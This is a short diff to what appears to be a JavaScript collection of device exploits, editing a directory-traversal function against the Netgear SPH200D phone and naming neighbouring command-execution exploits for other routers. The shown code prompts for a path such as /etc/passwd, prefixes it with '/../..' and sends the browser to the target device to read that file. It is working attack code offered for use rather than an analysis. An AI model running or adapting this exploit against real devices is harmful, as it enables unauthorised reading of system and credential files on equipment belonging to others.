@@ -482,11 +482,12 @@ function wag200gb_command(ip)
 // Netgear SPH200D - Directory Traversal
 function sph200d_dirtraversal(ip)
 {
-
-	ip = ip || "192.168.178.103";
+	// This is a Skype phone, not a router, it doesn't have a default IP
 	path = prompt("Path: (ex: /etc/passwd)");
 	url = "/../.." + encodeURL(path);
-	document.location="http://"+ip+url;	
+	if (ip==null || ip==""){}else{
+		document.location="http://"+ip+url;
+	}
 }
 
 // Alcatel OmniPCX Office 210/061.1 - Remote Command Execution
